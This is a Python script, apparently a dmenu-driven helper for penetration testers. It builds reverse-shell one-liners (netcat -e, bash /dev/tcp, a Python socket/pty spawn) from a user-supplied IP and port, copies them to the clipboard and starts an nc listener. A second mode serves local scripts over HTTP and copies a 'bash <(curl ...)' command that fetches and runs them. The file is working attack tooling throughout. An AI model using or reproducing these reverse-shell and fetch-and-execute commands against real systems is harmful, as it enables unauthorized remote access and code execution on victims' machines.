#!/usr/bin/env python3

import clipboard
import dmenu
from os import listdir, system
from os.path import isfile, join, exists
from pathlib import Path

home = str(Path.home())


# Helper Functions
getKeys = lambda dict: \
						dict.keys()
copy = lambda text: \
						clipboard.copy(text)
buildShellCommand = lambda reverseShellTemplate, ip, port, sh: \
						reverseShellTemplates[reverseShellTemplate].replace("(ip)", ip).replace("(port)", port).replace("(sh)", sh)
buildPrompt = lambda options, prompt: \
						dmenu.show(options, prompt=prompt, lines=len(options), font="Monospace-16:normal")

reverseShellTemplates = {
	"netcat": "nc (ip) (port) -e (sh)",
	"bash": "bash -i >& /dev/tcp/(ip)/(port) 0>&1",
	"python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"(ip)\",(port)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"(sh)\")'"
}

menu = buildPrompt([
	"Reverse Shell",
	"Run Remote Script (creates a web server)"
], "Task")

if menu == "Reverse Shell":
	x = buildPrompt(getKeys(reverseShellTemplates), "What type of reverse shell do you want?")
	ip = buildPrompt([], "Type in your IP")
	port = buildPrompt([], "Type in your PORT (>1024 recommended)")

	copy(buildShellCommand(x, ip, port, "/bin/sh"))
	createListener = buildPrompt(["yes", "no"], "The reverse shell command has been copied to your clipboard. Do you want me to create a listener for you?( y/n )")

	if createListener == "yes":
		system(f"xterm -fa monaco -fs 13 -bg black -fg green -hold -e nc -nvlp {port}")	
elif menu == "Run Remote Script (creates a web server)":
	if not exists(f"{home}/.shlol/scripts"):
		buildPrompt([], "WARNING: ~/.shlol/scripts NOT FOUND! PLEASE CREATE IT AND PUT YOUR SCRIPTS IN IT")
	else:
		onlyfiles = [f for f in listdir(f"{home}/.shlol/scripts") if isfile(join(f"{home}/.shlol/scripts", f))]
		script = buildPrompt(onlyfiles, "What script do you want to serve?")
		ip = buildPrompt([], "What's your IP?")
		port = buildPrompt([], "What's your PORT (>1024 recommended)?")
		copy(f"bash <(curl -s http://{ip}:{port}/{script})")
		createServer = buildPrompt(["yes", "no"], "The command to run the file from your server has been copied. Do you want me to create a web server for you?( y/n )")
		if createServer == "yes":
			system(f"xterm -fa monaco -fs 13 -bg black -fg green -hold -e \"cd {home}/.shlol/scripts;python3 -m http.server {port}\"")	